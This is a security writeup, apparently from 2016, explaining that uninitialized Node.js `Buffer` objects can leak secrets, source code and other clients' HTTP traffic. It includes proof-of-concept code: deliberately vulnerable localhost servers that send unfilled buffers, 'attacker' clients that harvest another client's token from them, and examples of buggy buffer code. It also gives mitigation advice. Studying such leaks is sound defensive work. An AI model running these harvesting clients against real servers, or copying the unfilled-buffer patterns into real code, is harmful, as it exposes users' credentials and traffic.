# Node.js `Buffer` knows everything.

*Note: this writeup has been lying under the hood for some time as a private gist, its primary intent was to raise awareness of the danger of using uninitialized `Buffer` objects. It describes only the current situation and recommendations (for Node.js v5.4.1 / v4.2.4 packages), but I hope that this issue will be solved in a better way on the Node.js side in later versions. I will post a follow-up with a proposed solution soon enough.*

--

*Tl;dr: if your server-side code, under any circumstances, leaks uninitialized `Buffer`s to the client (including partially uninitialized), you are doomed.*

Those `Buffer`s *will* contain http traffic to/from other clients, your db passwords, private certificates, your app source code and the content of configuration files.

_This is not some kind of a newly-discovered bug, it's how the Buffer API was designed from the start — `Buffer(number)` is similar to `malloc()` in this sense. The fact that it could contain sensitive data is properly [documented](https://nodejs.org/api/buffer.html#buffer_new_buffer_size), just not everyone reads the documentation. I do not think that this API is well-designed, though, and my thoughts on how this situation could be improved are shared in a [follow-up post](Lets-fix-Buffer-API.md)._

If you fully understand that and are aware of how to prevent it — you could stop reading this note now, there will be nothing new for you here. I have seen several people who are not aware of that, so this note will be used as a reference in such situations.

## So, what's the reason for that?

`Buffer` objects, unlike TypedArrays, are not zero filled if created with a `new Buffer(size)` constructor (or its alias `Buffer(size)`). The memory that they use as the underlying storage could (and will) contain stuff that there was before the creation of this `Buffer`, most importantly — parts of other, previosly used `Buffer` objects that were garbage collected.

Also it should be taken into an account that pretty much every standard I/O operation in Node.js uses `Buffer`s — reading a file, requiring a module, receiving network traffic, passing stuff to the `crypto` module.

## Testcases

Note: each one of those could require several launches to hit something.

##### Hardcoded variable:
```javascript
var token = 'paSsWord!ASD, totally secret!';
for (var step = 0; step < 100000; step++) {
    var buf = (new Buffer(200)).toString('ascii');
    if (buf.indexOf(token) !== -1) {
        console.log('Found at step ' + step + ': ' + buf);
    }
}
```

##### Comment (notice how this prints parts of your source):
```javascript
var token = 'pass' + 'word!ASD';
//password!ASD
for (var step = 0; step < 100000; step++) {
    var buf = (new Buffer(100)).toString('ascii');
    if (buf.indexOf(token) !== -1) {
        console.log('Found at step ' + step + ': ' + buf);
    }
}
```

##### Crypto:
```javascript
var crypto = require('crypto');
var token = 'password' + Math.random().toString(32);
crypto.pbkdf2(token, 'salt', 1, 2, function(err, result) {} )
for (var step = 0; step < 100000; step++) {
    var buf = (new Buffer(200)).toString('ascii');
    var ind = buf.indexOf(token);
    if (ind !== -1) {
        console.log('Found at step ' + step + ': ' + buf);
    }
}
```

##### http (notice how this prints raw http traffic):
server.js:
```javascript
require('http').createServer(function(req, res) {
	if (/^\/in\//.test(req.url)) {
		req.on('data', function (chunk) {});
		req.on('end', function() {
			res.end();
		});
		return;
	}
	if (/^\/out\//.test(req.url)) {
		var x = new Buffer(1000);
		res.write(x);
		res.end();
		return;
	}
	res.end();
}).listen(7777);
```

client.js:
```javascript
// Two clients in one:
//   valid() is the valid client that sends the token.
//   attacker() makes the server to leak the data and inspects it.

var http = require('http');
var token = 'MySecretKey';

function attacker() {
	http.request({host: 'localhost', port: 7777, path: '/out/'}, function(res) {
		res.on('data', function (chunk) {
			var data = chunk.toString();
			data = data.toString('utf-8');
			if (data.indexOf(token) !== -1) {
				console.log('found!');
				console.log(data);
			}
		});
		res.on('end', attacker);
	}).end();
}

for (var i = 0; i < 10; i++) {
	attacker();
}

function valid() {
	var req = http.request({host: 'localhost', port: 7777, path: '/in/', method: 'POST'}, function(res) {
		res.on('data', function() {});
		res.on('end', function() {
			setTimeout(valid, 100);
		});
	});
	req.write(token);
	req.end();
}
valid();
```

This is also true for split files, loading configuration files, http traffic, etc.

## How to avoid leaks?

Make sure that all your `Buffer` objects are initialized.

The best way would be to allocate `Buffer`s in a form of `var buf = new Buffer(size).fill(0)` — in this case you can immediately see that the buffer is initialized on the exact same line. This is useful for performing quick checks using `grep` to find where `Buffer`s are manually allocated.

If you are optimizing for speed in a hot code path, and are 100% sure what you are doing — it's perfectly fine that you use just `new Buffer(size)` and then fill in each byte manually. But please double check that you don't abort and return an partially uninitialized `Buffer` in case of something going wrong (any error, etc).

An example of _bad_ code:
```javascript
function makeBufferFromData(data) {
  var buf = new Buffer(data.length * 2);
  for (var i = 0; i < data.length; i++) {
    if (data[i] !== 0) {
      buf[2 * i] =  buf[2 * i + 1] = data[i];
    }
  }
  return buf;
}
```
Another example of _bad_ code:
```javascript
function makeBufferFromData(data) {
  var buf = new Buffer(data.length * 2);
  for (var i = 0; i < data.length; i++) {
    if (data[i] === 0) {
      // Abort and return partial content
      return buf;
    }
    buf[2 * i] =  buf[2 * i + 1] = data[i];
  }
  return buf;
}
```

You should definitely avoid sending uninitialized `Buffer` objects over the network, even just for testing purposes (I have seen people doing that in tests).

## Can this be checked automatically using a static analyzer?

Perhaps, but I am not aware of any static analyzers that do this. Maybe implementing an `eslint` plugin would be a good idea, but I am not going to do that. Ping me, if you are aware of such a plugin or are making one.

## Bonus: Node.js v4.1.0 issue.

Node.js v4.1.0 had an issue with TypedArrays being not zero-filled under some circumstances. This was first introduced in v4.1.0 and then immediately fixed in [v4.1.1](https://github.com/nodejs/node/issues/2943), so v4.1.0 was the only affected version.

While some may argue that it's unlikely that this could be exploited on v4.1.0, here is a complete testcase (requires v4.1.0 to actually leak something):

server.js:
```javascript
// Before starting this, create an empty file `emptyFile`. You could do that with `touch emptyFile`.

var http = require('http');
var fs = require('fs');

function doSomethingWithData(data, c) {
	setTimeout(c, 100);
}

http.createServer(function(req, res) {
	// This represents one endpoint
	if (req.url === '/file1') {
		// We must have an empty file on the server that is readed when doing something
		fs.readFile('emptyFile', function(err, data) {
			doSomethingWithData(data, function() {
				res.write('done');
				res.end();
			});
		});
		return;
	}

	// This represents an endpoint that receives data
	if (/^\/stuff\//.test(req.url)) {
		req.on('data', function (chunk) {});
		req.on('end', function() {
			res.end();
		});
		return;
	}

	// This represents another endpoint
	if (/^\/token\//.test(req.url)) {
		var x = new Uint8Array(1000);
		if (req.url !== '/token/invalid') {
			x.fill(42); // fill x with something for valid stuff
		} // else do nothing for invalid stuff, but that's ok, correct? Nothing could go wrong. There are zeroes there!
		res.write(x.toString());
		res.end();
		return;
	}

	res.end();
}).listen(7777);
```

alternate server2.js that does not deal with files:
```javascript
var http = require('http');
var fs = require('fs');

function doSomethingWithData(data, c) {
	setTimeout(c, 100);
}

http.createServer(function(req, res) {
	// This represents one endpoint
	// This is alternative to reading an empty file. Does not deal with files.
	if (req.url === '/file1') {
		var chunks = [];
		req.on('data', function(chunk) {
			// chunk is a Buffer
			chunks.push(chunk);
		});
		req.on('end', function() {
			// This is a common way of collecting the request body.
			var data = Buffer.concat(chunks);
			doSomethingWithData(data, function() {
				res.end();
			});
		});
		return;
	}

	// This represents an endpoint that receives data
	if (/^\/stuff\//.test(req.url)) {
		req.on('data', function (chunk) {});
		req.on('end', function() {
			res.end();
		});
		return;
	}

	// This represents another endpoint
	if (/^\/token\//.test(req.url)) {
		var x = new Uint8Array(1000);
		if (req.url !== '/token/invalid') {
			x.fill(42); // fill x with something for valid stuff
		} // else do nothing for invalid stuff, but that's ok, correct? Nothing could go wrong. There are zeroes there!
		res.write(x.toString());
		res.end();
		return;
	}

	res.end();
}).listen(7777);
```

client.js:
```javascript
// Two clients in one:
//   valid() is the valid client that sends the token.
//   attacker() makes the server to leak the data and inspects it.

var http = require('http');

var token = 'MySecretKey';

var fine = new Uint8Array(1000).toString();

function parse10(x) {
	return parseInt(x, 10);
};

function attacker() {
	http.request({host: 'localhost', port: 7777, path: '/file1'}, function(res) {
		res.on('data', function() {});
	}).end();
	http.request({host: 'localhost', port: 7777, path: '/token/invalid'}, function(res) {
		res.on('data', function (chunk) {
			var data = chunk.toString();
			if (data === fine) {
				return;
			}
			data = new Buffer(data.split(',').map(parse10));
			data = data.toString('utf-8');
			if (data.indexOf(token) !== -1) {
				console.log('found!');
				console.log(data);
			}
		});
		res.on('end', attacker);
	}).end();
}

for (var i = 0; i < 10; i++) {
	attacker();
}

function valid() {
	var req = http.request({host: 'localhost', port: 7777, path: '/stuff/' + token, method: 'POST'}, function(res) {
		res.on('data', function() {});
		res.on('end', function() {
			setTimeout(valid, 100);
		});
	});
	req.write(token);
	req.end();
}
valid();
```

Refs:
* https://github.com/nodejs/node/issues/2930
* https://github.com/nodejs/node/pull/2931
* https://github.com/nodejs/node/pull/2995

--

Published: 2016-01-14.

Historic revisions (which are not in this repo): https://gist.github.com/ChALkeR/e5cb4fb0587e98b88280/revisions.

Historic code samples: [1](https://gist.github.com/ChALkeR/0ae2f111395b353b8e44), [2](https://gist.github.com/ChALkeR/ac211820feb3eb128ab3), [3](https://gist.github.com/ChALkeR/515e505d3d922fbfd58f), [4](https://gist.github.com/ChALkeR/dedf5b64b1152c7ad0e7), [5](https://gist.github.com/ChALkeR/e0ecbd396e1c9c649a89), [6](https://gist.github.com/ChALkeR/8caafa6099bc4c2dabcb).

If you have any questions to me, contact me over Gitter (@ChALkeR) or IRC (ChALkeR@freenode).
